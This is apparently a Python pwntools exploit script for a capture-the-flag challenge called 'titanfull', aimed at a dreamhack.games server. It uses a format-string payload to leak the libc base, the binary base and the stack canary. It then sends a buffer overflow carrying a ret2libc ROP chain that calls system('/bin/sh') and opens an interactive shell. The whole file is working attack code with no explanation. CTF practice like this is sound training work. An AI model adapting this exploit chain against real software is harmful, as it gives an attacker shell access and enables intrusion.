#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./titanfull_patched',checksec=False)
libc = ELF('./libc-2.31.so')
ld = ELF('./ld-2.31.so')

#p = process()
p = remote('host3.dreamhack.games', 18429)
#gdb.attach(p,gdbscript=
 #          '''
#            b*menu+196
 #           b*menu+273
#            b*vanguard+75
 #          ''')
payload = b'%21$p|%19$p|%17$p|'
p.sendafter(b' > ',payload)
p.recvuntil(b'hello, ')
leak = p.recvuntil(b'.')[:-1].split(b'|')
print(leak)
libc.address = int(leak[0],16) - 0x24083
exe.address = int(leak[1],16) - 0x164c
canary = int(leak[2],16)
pop_rdi = 0x00000000000016c3 + exe.address
print("exe base: ",hex(exe.address))
print("found canary: ",hex(int(leak[2],16)))
print("libc adress: ",hex(libc.address))
input()
payload = b'a'*24 + p64(canary) + p64(0) + p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00'))) + p64(pop_rdi+1) + p64(libc.sym.system)
p.sendlineafter(b'> ',b'7274')
p.sendlineafter(b' titan : ',payload)
p.interactive()
